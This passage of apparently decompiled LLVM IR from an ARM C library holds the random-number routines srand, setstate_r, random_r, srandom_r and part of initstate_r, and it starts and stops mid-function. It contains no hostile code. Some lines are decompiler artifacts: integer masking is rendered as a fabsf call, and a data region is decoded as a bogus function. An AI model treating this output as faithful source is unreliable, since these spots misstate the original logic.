  br i1 %v0_c318, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c318
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c318, %bb
  %v10_c32c = phi i32 [ %arg1, %dec_label_pc_c318 ], [ 0, %bb ]
  ret i32 %v10_c32c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_c330 = load i32, i32* @r4, align 4
  %v6_c330 = load i32, i32* @r5, align 4
  %v9_c330 = load i32, i32* @r6, align 4
  %v15_c330 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  %v2_c344 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 200), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_c360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c360)
  %v0_c374 = load i32, i32* @r4, align 4
  %v2_c374 = add i32 %v0_c374, 16
  %v3_c374 = inttoptr i32 %v2_c374 to i32*
  %v4_c374 = load i32, i32* %v3_c374, align 4
  call void @__pseudo_branch(i32 %v4_c374)
  %v0_c384 = load i32, i32* @r6, align 4
  store i32 %v0_c384, i32* @r0, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  %v2_c388 = add i32 %v0_c388, 352
  %v2_c38c = inttoptr i32 %v0_c384 to i32*
  %v3_c38c = call i32 @srandom_r(i32* %v2_c38c, i32 %v2_c388)
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v2_c3a0 = add i32 %v0_c3a0, 24
  %v3_c3a0 = inttoptr i32 %v2_c3a0 to i32*
  %v4_c3a0 = load i32, i32* %v3_c3a0, align 4
  call void @__pseudo_branch(i32 %v4_c3a0)
  store i32 %v3_c330, i32* @r4, align 4
  store i32 %v6_c330, i32* @r5, align 4
  store i32 %v9_c330, i32* @r6, align 4
  store i32 %v15_c330, i32* @lr, align 4
  ret i32 %v2_c344
}

define i32 @function_c3bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_c3bc:
  %v0_c3bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c3bc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c3bc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c3bc, %bb
  %v10_c3d0 = phi i32 [ %arg1, %dec_label_pc_c3bc ], [ 0, %bb ]
  ret i32 %v10_c3d0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c3d4 = load i32, i32* @r4, align 4
  store i32 %v3_c3d4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_c3dc = add i32 %tmp, 12
  %v2_c3dc = inttoptr i32 %v1_c3dc to i8*
  %v3_c3dc = load i8, i8* %v2_c3dc, align 1
  %v4_c3dc = zext i8 %v3_c3dc to i32
  store i32 %v4_c3dc, i32* %r1.global-to-local, align 4
  %v2_c3e0 = icmp eq i8 %v3_c3dc, 0
  store i1 %v2_c3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3e0, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_c3e812 = add i32 %arg1, 4
  store i32 %v1_c3e812, i32* %r6.global-to-local, align 4
  %v1_c3ec13 = add i32 %tmp, 8
  %v2_c3ec14 = inttoptr i32 %v1_c3ec13 to i32*
  %v3_c3ec15 = load i32, i32* %v2_c3ec14, align 4
  store i32 %v3_c3ec15, i32* %r0.global-to-local, align 4
  %v3_c408 = add i32 %v3_c3ec15, -4
  %v4_c408 = inttoptr i32 %v3_c408 to i32*
  store i32 %v4_c3dc, i32* %v4_c408, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_c3e4 = add i32 %tmp, 4
  %v3_c3e4 = inttoptr i32 %v2_c3e4 to i32*
  %v4_c3e4 = load i32, i32* %v3_c3e4, align 4
  %v1_c3e8 = add i32 %arg1, 4
  store i32 %v1_c3e8, i32* %r6.global-to-local, align 4
  %v1_c3ec = add i32 %tmp, 8
  %v2_c3ec = inttoptr i32 %v1_c3ec to i32*
  %v3_c3ec = load i32, i32* %v2_c3ec, align 4
  store i32 %v3_c3ec, i32* %r0.global-to-local, align 4
  %v3_c3f4 = sub i32 %v4_c3e4, %v3_c3ec
  %v4_c3f8 = sdiv i32 %v3_c3f4, 4
  %v4_c3fc = sext i8 %v3_c3dc to i32
  store i32 %v4_c3fc, i32* %r1.global-to-local, align 4
  %v4_c404 = mul i32 %v4_c3f8, 5
  %v5_c404 = add i32 %v4_c404, %v4_c3fc
  %v3_c40c = add i32 %v3_c3ec, -4
  %v4_c40c = inttoptr i32 %v3_c40c to i32*
  store i32 %v5_c404, i32* %v4_c40c, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_c414 = load i32, i32* %r6.global-to-local, align 4
  %v1_c414 = add i32 %v0_c414, -4
  %v2_c414 = inttoptr i32 %v1_c414 to i32*
  %v3_c414 = load i32, i32* %v2_c414, align 4
  %v2_c41c = udiv i32 %v3_c414, 5
  %v3_c41c = urem i32 %v3_c414, 5
  store i32 %v2_c41c, i32* %r0.global-to-local, align 4
  store i32 %v3_c41c, i32* %r1.global-to-local, align 4
  %v2_c424 = icmp ugt i32 %v3_c41c, 3
  %v7_c424 = icmp eq i32 %v3_c41c, 4
  store i1 %v7_c424, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r5.global-to-local, align 4
  %v2_c42c = xor i1 %v7_c424, true
  %v3_c42c = and i1 %v2_c424, %v2_c42c
  br i1 %v3_c42c, label %dec_label_pc_c494, label %dec_label_pc_c430

dec_label_pc_c430:                                ; preds = %bb
  %v4_c438 = mul nuw nsw i32 %v3_c41c, 4
  %v5_c438 = add i32 %v4_c438, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37476)
  %v1_c43c = add i32 %v4_c438, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37456)
  %v2_c43c = inttoptr i32 %v1_c43c to i32*
  %v3_c43c = load i32, i32* %v2_c43c, align 4
  store i32 %v3_c43c, i32* %r5.global-to-local, align 4
  %v6_c440 = inttoptr i32 %v5_c438 to i32*
  %v7_c440 = load i32, i32* %v6_c440, align 4
  store i32 %v7_c440, i32* %r7.global-to-local, align 4
  %v2_c444 = icmp eq i32 %v3_c41c, 0
  store i1 %v2_c444, i1* %cpsr_z.global-to-local, align 1
  %v1_c448 = trunc i32 %v3_c43c to i8
  %v2_c448 = load i32, i32* %r4.global-to-local, align 4
  %v3_c448 = add i32 %v2_c448, 13
  %v4_c448 = inttoptr i32 %v3_c448 to i8*
  store i8 %v1_c448, i8* %v4_c448, align 1
  %v0_c44c = load i32, i32* %r7.global-to-local, align 4
  %v1_c44c = trunc i32 %v0_c44c to i8
  %v2_c44c = load i32, i32* %r4.global-to-local, align 4
  %v3_c44c = add i32 %v2_c44c, 14
  %v4_c44c = inttoptr i32 %v3_c44c to i8*
  store i8 %v1_c44c, i8* %v4_c44c, align 1
  %v0_c450 = load i32, i32* %r1.global-to-local, align 4
  %v1_c450 = trunc i32 %v0_c450 to i8
  %v2_c450 = load i32, i32* %r4.global-to-local, align 4
  %v3_c450 = add i32 %v2_c450, 12
  %v4_c450 = inttoptr i32 %v3_c450 to i8*
  store i8 %v1_c450, i8* %v4_c450, align 1
  %v0_c454 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c454, label %dec_label_pc_c480, label %dec_label_pc_c458

dec_label_pc_c458:                                ; preds = %dec_label_pc_c430
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_c45c = load i32, i32* %r6.global-to-local, align 4
  %v1_c45c = add i32 %v0_c45c, -4
  %v2_c45c = inttoptr i32 %v1_c45c to i32*
  %v3_c45c = load i32, i32* %v2_c45c, align 4
  %v2_c460 = sdiv i32 %v3_c45c, 5
  store i32 %v2_c460, i32* %r0.global-to-local, align 4
  %v4_c464 = mul i32 %v2_c460, 4
  %v5_c464 = add i32 %v4_c464, %v0_c45c
  %v1_c468 = load i32, i32* %r4.global-to-local, align 4
  %v2_c468 = add i32 %v1_c468, 4
  %v3_c468 = inttoptr i32 %v2_c468 to i32*
  store i32 %v5_c464, i32* %v3_c468, align 4
  %v0_c46c = load i32, i32* %r7.global-to-local, align 4
  %v1_c46c = load i32, i32* %r0.global-to-local, align 4
  %v2_c46c = add i32 %v1_c46c, %v0_c46c
  %v0_c470 = load i32, i32* %r5.global-to-local, align 4
  %v2_c474 = udiv i32 %v2_c46c, %v0_c470
  %v3_c474 = urem i32 %v2_c46c, %v0_c470
  store i32 %v2_c474, i32* %r0.global-to-local, align 4
  %v0_c478 = load i32, i32* %r6.global-to-local, align 4
  %v4_c478 = mul i32 %v3_c474, 4
  %v5_c478 = add i32 %v0_c478, %v4_c478
  store i32 %v5_c478, i32* %r1.global-to-local, align 4
  %v1_c47c = load i32, i32* %r4.global-to-local, align 4
  %v2_c47c = inttoptr i32 %v1_c47c to i32*
  store i32 %v5_c478, i32* %v2_c47c, align 4
  br label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %dec_label_pc_c430, %dec_label_pc_c458
  %v0_c480 = load i32, i32* %r6.global-to-local, align 4
  %v1_c480 = load i32, i32* %r5.global-to-local, align 4
  %v4_c480 = mul i32 %v1_c480, 4
  %v5_c480 = add i32 %v4_c480, %v0_c480
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c488 = load i32, i32* %r4.global-to-local, align 4
  %v2_c488 = add i32 %v1_c488, 16
  %v3_c488 = inttoptr i32 %v2_c488 to i32*
  store i32 %v5_c480, i32* %v3_c488, align 4
  %v0_c48c = load i32, i32* %r6.global-to-local, align 4
  %v1_c48c = load i32, i32* %r4.global-to-local, align 4
  %v2_c48c = add i32 %v1_c48c, 8
  %v3_c48c = inttoptr i32 %v2_c48c to i32*
  store i32 %v0_c48c, i32* %v3_c48c, align 4
  %v1_c4ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4a4

dec_label_pc_c494:                                ; preds = %bb
  %v0_c494 = call i32 @__GI___errno_location()
  %v2_c49c = inttoptr i32 %v0_c494 to i32*
  store i32 22, i32* %v2_c49c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4a4

dec_label_pc_c4a4:                                ; preds = %dec_label_pc_c480, %dec_label_pc_c494
  %v1_c4ac = phi i32 [ %v1_c4ac.pre, %dec_label_pc_c480 ], [ -1, %dec_label_pc_c494 ]
  %v2_c4a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c4a8, i32* @r4, align 4
  ret i32 %v1_c4ac

; uselistorder directives
  uselistorder i32 %v0_c470, { 1, 0 }
  uselistorder i32 %v2_c46c, { 1, 0 }
  uselistorder i32 %v3_c414, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c4a4, { 1, 0 }
  uselistorder label %dec_label_pc_c480, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c4b8 = load i32, i32* @r4, align 4
  store i32 %v3_c4b8, i32* %stack_var_-8, align 4
  %v1_c4bc = add i32 %tmp, 12
  %v2_c4bc = inttoptr i32 %v1_c4bc to i8*
  %v3_c4bc = load i8, i8* %v2_c4bc, align 1
  %v4_c4bc = sext i8 %v3_c4bc to i32
  store i32 %v4_c4bc, i32* %r3.global-to-local, align 4
  %v2_c4c0 = icmp eq i8 %v3_c4bc, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_c4cc = add i32 %tmp, 8
  %v2_c4cc = inttoptr i32 %v1_c4cc to i32*
  %v3_c4cc = load i32, i32* %v2_c4cc, align 4
  store i32 %v3_c4cc, i32* %lr.global-to-local, align 4
  br i1 %v2_c4c0, label %dec_label_pc_c4d4, label %dec_label_pc_c4f8

dec_label_pc_c4d4:                                ; preds = %entry
  %v1_c4d4 = inttoptr i32 %v3_c4cc to i32*
  %v2_c4d4 = load i32, i32* %v1_c4d4, align 4
  store i32 %v2_c4d4, i32* %r2.global-to-local, align 4
  %v2_c4dc = mul i32 %v2_c4d4, 1103515245
  %v1_c4e4 = add i32 %v2_c4dc, 12345
  %tmp6 = bitcast i32 %v1_c4e4 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_c4e8 = bitcast float %tmp7 to i32
  store i32 %v1_c4e8, i32* %r3.global-to-local, align 4
  store i32 %v1_c4e8, i32* %v1_c4d4, align 4
  %v0_c4f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_c4f0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_c4f0, i32* %v2_c4f0, align 4
  br label %dec_label_pc_c538

dec_label_pc_c4f8:                                ; preds = %entry
  %v2_c4f8 = load i32, i32* %arg1, align 4
  store i32 %v2_c4f8, i32* %r2.global-to-local, align 4
  %v1_c4fc = add i32 %tmp, 4
  %v2_c4fc = inttoptr i32 %v1_c4fc to i32*
  %v3_c4fc = load i32, i32* %v2_c4fc, align 4
  store i32 %v3_c4fc, i32* %r0.global-to-local, align 4
  %v1_c500 = inttoptr i32 %v2_c4f8 to i32*
  %v2_c500 = load i32, i32* %v1_c500, align 4
  store i32 %v2_c500, i32* %r1.global-to-local, align 4
  %v1_c504 = inttoptr i32 %v3_c4fc to i32*
  %v2_c504 = load i32, i32* %v1_c504, align 4
  %v4_c504 = add i32 %v3_c4fc, 4
  store i32 %v4_c504, i32* %r0.global-to-local, align 4
  %v2_c508 = add i32 %v2_c504, %v2_c500
  store i32 %v2_c508, i32* %r3.global-to-local, align 4
  store i32 %v2_c508, i32* %v1_c500, align 4
  %v3_c50c = load i32, i32* %r2.global-to-local, align 4
  %v4_c50c = add i32 %v3_c50c, 4
  store i32 %v4_c50c, i32* %r2.global-to-local, align 4
  %v0_c510 = load i32, i32* %ip.global-to-local, align 4
  %v1_c510 = add i32 %v0_c510, 16
  %v2_c510 = inttoptr i32 %v1_c510 to i32*
  %v3_c510 = load i32, i32* %v2_c510, align 4
  store i32 %v3_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i32, i32* %r3.global-to-local, align 4
  %v3_c514 = udiv i32 %v0_c514, 2
  store i32 %v3_c514, i32* %r3.global-to-local, align 4
  %v3_c518 = icmp ult i32 %v4_c50c, %v3_c510
  %v1_c51c = load i32, i32* %r4.global-to-local, align 4
  %v2_c51c = inttoptr i32 %v1_c51c to i32*
  store i32 %v3_c514, i32* %v2_c51c, align 4
  br i1 %v3_c518, label %dec_label_pc_c528, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_c4f8
  %v1_c520 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_c520, i32* %r2.global-to-local, align 4
  %v0_c530.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_c528:                                ; preds = %dec_label_pc_c4f8
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = load i32, i32* %r1.global-to-local, align 4
  %v3_c528 = icmp ult i32 %v0_c528, %v1_c528
  br i1 %v3_c528, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_c528
  %v1_c52c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_c52c, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_c528, %._crit_edge, %bb
  %v0_c530 = phi i32 [ %v0_c530.pre, %._crit_edge ], [ %v0_c528, %dec_label_pc_c528 ], [ %v1_c52c, %bb ]
  %v1_c530 = load i32, i32* %ip.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 4
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* %r2.global-to-local, align 4
  %v1_c534 = load i32, i32* %ip.global-to-local, align 4
  %v2_c534 = inttoptr i32 %v1_c534 to i32*
  store i32 %v0_c534, i32* %v2_c534, align 4
  br label %dec_label_pc_c538

dec_label_pc_c538:                                ; preds = %dec_label_pc_c4d4, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c53c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c53c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_c514, { 1, 0 }
  uselistorder i32 %v1_c4e8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_c538, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_c548 = load i32, i32* @r4, align 4
  store i32 %v3_c548, i32* %stack_var_-36, align 4
  %v1_c54c = add i32 %tmp, 12
  %v2_c54c = inttoptr i32 %v1_c54c to i8*
  %v3_c54c = load i8, i8* %v2_c54c, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_c55c = load i8, i8* %v2_c54c, align 1
  %tmp33 = icmp ugt i8 %v3_c54c, 4
  br i1 %tmp33, label %.dec_label_pc_c608_crit_edge, label %dec_label_pc_c568

.dec_label_pc_c608_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_c608

dec_label_pc_c568:                                ; preds = %entry
  %v0_c568 = load i32, i32* @r0, align 4
  %v2_c568 = icmp eq i32 %v0_c568, 0
  %v1_c56c = add i32 %tmp, 8
  %v2_c56c = inttoptr i32 %v1_c56c to i32*
  %v3_c56c = load i32, i32* %v2_c56c, align 4
  store i32 %v3_c56c, i32* %r6.global-to-local, align 4
  br i1 %v2_c568, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_c568
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_c568, %bb
  %v0_c578 = phi i32 [ %v0_c568, %dec_label_pc_c568 ], [ 1, %bb ]
  %v2_c574 = icmp eq i8 %v3_c55c, 0
  %v2_c578 = inttoptr i32 %v3_c56c to i32*
  store i32 %v0_c578, i32* %v2_c578, align 4
  br i1 %v2_c574, label %dec_label_pc_c604, label %dec_label_pc_c580

dec_label_pc_c580:                                ; preds = %bb23
  %v1_c580 = add i32 %tmp, 13
  %v2_c580 = inttoptr i32 %v1_c580 to i8*
  %v3_c580 = load i8, i8* %v2_c580, align 1
  %v4_c580 = sext i8 %v3_c580 to i32
  store i32 %v4_c580, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_c58c = load i32, i32* @r0, align 4
  store i32 %v0_c58c, i32* %r4.global-to-local, align 4
  %v0_c590 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_c590, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_c5d025 = icmp sgt i8 %v3_c580, 1
  br i1 %v5_c5d025, label %dec_label_pc_c59c, label %dec_label_pc_c5d4

dec_label_pc_c59c:                                ; preds = %dec_label_pc_c580, %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge
  %v1_c5b0 = phi i32 [ %v1_c5b0.pre, %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge ], [ 2836, %dec_label_pc_c580 ]
  %v1_c5a4 = phi i32 [ %v1_c5a4.pre, %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge ], [ 16807, %dec_label_pc_c580 ]
  %v0_c5a027 = phi i32 [ %v0_c5c4.pre, %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge ], [ %v0_c58c, %dec_label_pc_c580 ]
  %v1_c5bc26 = phi i32 [ %v5_c5bc, %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge ], [ %v0_c590, %dec_label_pc_c580 ]
  %v3_c59c = urem i32 %v0_c5a027, ptrtoint (i32* @global_var_1f31d.149 to i32)
  %v2_c5a4 = mul i32 %v1_c5a4, %v3_c59c
  %v2_c5ac = sdiv i32 %v0_c5a027, ptrtoint (i32* @global_var_1f31d.149 to i32)
  %v2_c5b0 = mul i32 %v1_c5b0, %v2_c5ac
  %v2_c5b4 = sub i32 %v2_c5a4, %v2_c5b0
  %v8_c5b4 = icmp slt i32 %v2_c5b4, 0
  %v2_c5b8 = add i32 %v2_c5b4, 2147483647
  %v2_c5b8.v2_c5b4 = select i1 %v8_c5b4, i32 %v2_c5b8, i32 %v2_c5b4
  store i32 %v2_c5b8.v2_c5b4, i32* %r4.global-to-local, align 4
  %v2_c5bc = add i32 %v1_c5bc26, 4
  %v3_c5bc = inttoptr i32 %v2_c5bc to i32*
  store i32 %v2_c5b8.v2_c5b4, i32* %v3_c5bc, align 4
  %v4_c5bc = load i32, i32* %r8.global-to-local, align 4
  %v5_c5bc = add i32 %v4_c5bc, 4
  store i32 %v5_c5bc, i32* %r8.global-to-local, align 4
  %v0_c5c0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_c5c0.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_c5c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_c5cc = add i32 %v0_c5c0.pre, 1
  store i32 %v1_c5cc, i32* %r7.global-to-local, align 4
  %v5_c5d0 = icmp slt i32 %v0_c5c0.pre, %v1_c5c0.pre
  br i1 %v5_c5d0, label %dec_label_pc_c59c.dec_label_pc_c59c_crit_edge, label %dec_label_pc_c5c0.dec_label_pc_c5d4_crit_edge

dec_label_pc_c59c.dec_label_pc_c59c_crit_edge:    ; preds = %dec_label_pc_c59c
  %v1_c5a4.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_c5b0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c59c

dec_label_pc_c5c0.dec_label_pc_c5d4_crit_edge:    ; preds = %dec_label_pc_c59c
  %v0_c5e4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5c0.dec_label_pc_c5d4_crit_edge, %dec_label_pc_c580
  %v0_c5e4 = phi i32 [ %v0_c5e4.pre, %dec_label_pc_c5c0.dec_label_pc_c5d4_crit_edge ], [ %v0_c590, %dec_label_pc_c580 ]
  %v0_c5d8.lcssa = phi i32 [ %v1_c5c0.pre, %dec_label_pc_c5c0.dec_label_pc_c5d4_crit_edge ], [ %v4_c580, %dec_label_pc_c580 ]
  %v2_c5d8 = mul i32 %v0_c5d8.lcssa, 10
  store i32 %v2_c5d8, i32* @r4, align 4
  %v0_c5dc = load i32, i32* %r5.global-to-local, align 4
  %v1_c5dc = add i32 %v0_c5dc, 14
  %v2_c5dc = inttoptr i32 %v1_c5dc to i8*
  %v3_c5dc = load i8, i8* %v2_c5dc, align 1
  %v4_c5dc = sext i8 %v3_c5dc to i32
  %v2_c5e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_c5e0, i32* %r7.global-to-local, align 4
  %v4_c5e4 = mul nsw i32 %v4_c5dc, 4
  %v5_c5e4 = add i32 %v0_c5e4, %v4_c5e4
  %v1_c5e8 = inttoptr i32 %v0_c5dc to i32*
  store i32 %v5_c5e4, i32* %v1_c5e8, align 4
  %v3_c5e8 = add i32 %v0_c5dc, 4
  %v4_c5e8 = inttoptr i32 %v3_c5e8 to i32*
  %v5_c5e8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_c5e8, i32* %v4_c5e8, align 4
  br label %dec_label_pc_c5f4

dec_label_pc_c5f0:                                ; preds = %dec_label_pc_c5f4
  %v0_c5f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_c5f0 = inttoptr i32 %v0_c5f8 to i32*
  %v3_c5f0 = call i32 @__GI_random_r(i32* %v2_c5f0, i32 %v2_c5e0)
  br label %dec_label_pc_c5f4

dec_label_pc_c5f4:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5f0
  %v0_c5f4 = load i32, i32* @r4, align 4
  %v1_c5f4 = add i32 %v0_c5f4, -1
  store i32 %v1_c5f4, i32* @r4, align 4
  %v6_c5f4 = icmp slt i32 %v1_c5f4, 0
  br i1 %v6_c5f4, label %dec_label_pc_c604, label %dec_label_pc_c5f0

dec_label_pc_c604:                                ; preds = %dec_label_pc_c5f4, %bb23
  %v2_c60c.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_c608

dec_label_pc_c608:                                ; preds = %.dec_label_pc_c608_crit_edge, %dec_label_pc_c604
  %v2_c60c = phi i32 [ %v3_c548, %.dec_label_pc_c608_crit_edge ], [ %v2_c60c.pre, %dec_label_pc_c604 ]
  %v1_c610 = phi i32 [ -1, %.dec_label_pc_c608_crit_edge ], [ 0, %dec_label_pc_c604 ]
  store i32 %v2_c60c, i32* @r4, align 4
  ret i32 %v1_c610

; uselistorder directives
  uselistorder i32 %v1_c5f4, { 1, 0 }
  uselistorder i32 %v0_c5dc, { 1, 0, 2 }
  uselistorder i32 %v0_c5c0.pre, { 1, 0 }
  uselistorder i32 %v5_c5bc, { 1, 0 }
  uselistorder i32 %v0_c5a027, { 1, 0 }
  uselistorder i32 %v0_c590, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f31d.149 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_c608, { 1, 0 }
  uselistorder label %dec_label_pc_c5f4, { 1, 0 }
  uselistorder label %dec_label_pc_c59c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c614:
  %v0_c614 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c614, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c614
  %v2_c614 = load i32, i32* @r7, align 4
  %v5_c614 = udiv i32 %v2_c614, 8
  %v6_c614 = and i32 %v5_c614, %arg1
  %v3_c618 = load i32, i32* @fp, align 4
  %v8_c618 = shl i32 %v6_c614, %v3_c618
  %v9_c618 = and i32 %v8_c618, %arg1
  %v2_c61c = load i32, i32* @sp, align 4
  %v8_c61c = shl i32 %v2_c61c, %arg3
  %v9_c61c = and i32 %v8_c61c, %arg2
  call void @__pseudo_branch(i32 %v9_c61c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c614, %bb
  %v10_c61c = phi i32 [ %arg1, %dec_label_pc_c614 ], [ %v9_c618, %bb ]
  ret i32 %v10_c61c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
